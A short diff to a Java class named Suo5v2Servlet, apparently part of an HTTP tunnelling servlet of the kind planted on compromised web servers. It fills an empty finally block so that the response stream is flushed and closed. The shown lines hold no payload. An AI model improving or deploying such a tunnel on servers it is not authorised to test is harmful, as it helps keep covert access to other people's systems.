@@ -161,7 +161,11 @@ public class Suo5v2Servlet implements Servlet, Runnable, HostnameVerifier, X509T
             }
         } catch (Throwable e) {
         } finally {
-
+            try {
+                OutputStream out = resp.getOutputStream();
+                out.flush();
+                out.close();
+            } catch (Throwable ignored) {}
         }
     }
 
